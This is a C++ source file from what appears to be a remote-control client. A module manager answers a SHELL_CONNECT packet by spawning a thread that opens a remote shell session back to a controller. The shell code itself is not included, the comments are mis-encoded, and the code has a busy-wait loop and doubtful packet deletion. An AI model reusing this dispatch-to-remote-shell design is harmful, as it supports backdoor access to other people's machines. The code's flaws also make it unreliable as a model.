#include "pch.h"
#include "ModuleManage.h"
#include "Packet.h"
#include "SocketClient.h"
#include "SocketClientManage.h"
#include "MuaClient.h"
#include "ModuleShellRemote.h"





CModule::CModule(CSocketClient* pChildSocketClient) {
	m_pChildSocketClient = pChildSocketClient;
	m_pChildSocketClient->m_pModule = this;
}

CModule::CModule() {

}

CModule::~CModule() {

}


// �麯��
void CModule::OnRecvivePacket(CPacket* pPacket) {

}





CModuleManage::CModuleManage(CSocketClient* pMainSocketClient) {
	m_pMainSocketClient = pMainSocketClient;

	memset(m_ahThread, 0, sizeof(m_ahThread));
	m_dwThreadNum = 0;

}


CModuleManage::~CModuleManage() {

}


// �����Ƿ���ð�
BOOL CModuleManage::OnReceiveConnectPacket(CPacket* pPacket) {
	CPacket* pPacketCopy = new CPacket(*pPacket);

	switch (pPacket->m_PacketHead.wCommandId) {

	case SHELL_CONNECT:
		m_ahThread[m_dwThreadNum++] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModuleShellRemote, (LPVOID)pPacketCopy, 0, NULL);
		break;

	default:
		//pPacket->
		delete pPacket;
		pPacket = NULL;
		return false;
	}
	delete pPacket;
	pPacket = NULL;
	return true;

	//CPacket* pPacketCopy = new CPacket(*pPacket);

	//switch (pPacket->m_PacketHead.wCommandId) {
	//case SHELL_CONNECT:
	//	m_ahThread[m_dwThreadNum++] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModuleShellRemote, (LPVOID)pPacketCopy, 0, NULL);
	//	break;

	//case SHELL_EXECUTE:
	//	break;
	//default:
	//	break;
	//}


}

//extern CSocketClientManage* g_pSocketClientManage;
//extern CSocketClient* g_pMainSocketClient;

DWORD WINAPI RunModuleShellRemote(CPacket* pPacket)
{
	
	

	CSocketClient* pChildSocketClient = new CSocketClient(pPacket->m_pSocketClient->m_pMainSocketClient);
	//pChildSocketClient->StartSocketClient();
	CModuleShellRemote* pModule = new CModuleShellRemote(pChildSocketClient);			// ���������pChildSocketClient->m_pModule��ֵ


	//g_pSocketClientManage->AddNewSocketClientToList(pChildSocketClient);			// ��SocketClient����������µ�socket����

	pChildSocketClient->StartSocketClient();
	printf("CONNECT packet\n");
	//printf("%d\n", pChildSocketClient->m_pTcpPackClient->IsConnected());
	pChildSocketClient->SendPacket(SHELL_CONNECT, NULL, 0);

	//pChildSocketClient->WaitForExitEvent();
	while (true) {
		//printf("%d\n", pChildSocketClient->m_pTcpPackClient->IsConnected());
	}

	delete pPacket;
	pPacket = NULL;
	printf("�˳��߳�\n");
	return 0;
}